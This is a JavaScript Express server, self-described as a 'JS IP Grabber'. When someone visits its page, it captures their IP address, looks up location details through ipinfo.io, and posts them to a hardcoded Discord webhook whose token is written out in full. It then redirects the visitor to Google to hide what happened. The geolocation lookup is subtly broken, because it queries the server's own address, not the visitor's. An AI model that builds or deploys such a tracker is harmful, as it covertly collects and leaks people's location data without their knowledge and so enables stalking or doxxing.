const express = require("express");
const request = require("request");

const REDIRECT = "https://www.google.com";
const WEBHOOK = "https://discord.com/api/webhooks/1233625668680548453/u6wZQkLmudTEKgwTcsiGIeEFkTMO6V_dqAgD0RZv--oOua90OLRk3fvEq17qZa0jU3eO";
const PORT = 3000;

const app = express();

app.get("/", (req, res) => {
  const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;

  // Send IP information to Discord webhook
  request("https://ipinfo.io/?format=json", (err, response, body) => {
    if (!err && response.statusCode === 200) {
      const json = JSON.parse(body);

      request.post(WEBHOOK, {
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          username: "n9yan",
          avatar_url: "",
          content: "@everyone",
          embeds: [
            {
              title: "Someone visited the JS IP Grabber!",
              footer: {
                text: "JS IP Grabber",
              },
              color: 16711826,
              description: `**IP:** \`${ip}\`
                                          **Country:** \`${json.country}\`
                                          **Region:** \`${json.region}\`
                                          **Town/City:** \`${json.city}\`
                                          **ZIP:** \`${json.postal}\`
                                          **LOC:** \`${json.loc}\`
                                          **Org:** \`${json.org}\`
                                          **Timezone:** \`${json.timezone}\`
                                          **Hostname:** \`${json.hostname}\``,
            },
          ],
        }),
      });
    } else {
      console.error("Error getting IP information:", err);
    }
  });

  // Redirect the user to the specified URL after a delay
  setTimeout(() => {
    res.redirect(REDIRECT);
  }, 500);
});

app.listen(PORT, () => {
  console.log("Server is running on port", PORT);
});
